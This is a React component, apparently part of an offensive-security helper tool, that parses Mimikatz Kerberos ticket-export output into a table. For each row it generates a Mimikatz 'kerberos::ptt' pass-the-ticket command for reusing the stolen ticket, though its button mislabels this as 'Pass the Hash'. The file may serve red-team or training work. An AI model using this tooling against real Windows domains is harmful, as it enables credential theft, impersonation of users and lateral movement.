import React from "react";
import { Button } from "@material-ui/core";
import Typography from "@material-ui/core/Typography";
import Helper from "./Helper";
export default ({ data, setOpenHelper, openHelper }) => {
  let [PTT, setPTT] = React.useState(``);
  let tickets = data.split("Start/End/MaxRenew");
  let listenTickets = tickets
    .filter((user) => user.split("Saved to file")[1])
    .map((user) => (
      <tr>
        <td>{user.split("Client Name")[1].split(" ")[4]}</td>
        <td>
          {user.split("Client Name")[1].split(" ")[4] &&
            user.split("Client Name")[1].split(" ")[7]}
        </td>
        <td>
          {user.split("Service Name")[1].split(" ")[4]
            ? user.split("Service Name")[1].split(" ")[3]
            : "-"}
        </td>
        <td>
          {user.split("Saved to file")[1]
            ? user.split("Saved to file")[1].split("!")[0]
            : "-"}
        </td>
        <td>
          <Button
            onClick={() => {
              setPTT(
                `mimikatz.exe "kerberos::ptt .\\${
                  user.split("Saved to file")[1].split("!")[0].split(" ")[1]
                }"`
              );
              setOpenHelper(true);
            }}
          >
            Pass the Hash
          </Button>
        </td>
      </tr>
    ));
  return (
    <div>
      <table>
        <tr>
          <th>Username</th>
          <th>Domain</th>
          <th>Service</th>
          <th>Ticket</th>
          <th>PTT</th>
        </tr>
        {listenTickets}
      </table>
      <Helper openHelper={openHelper} setOpenHelper={setOpenHelper}>
        <Typography variant="h6" style={{ flexGrow: 1, paddingTop: 10 }}>
          {PTT}
        </Typography>
      </Helper>
    </div>
  );
};
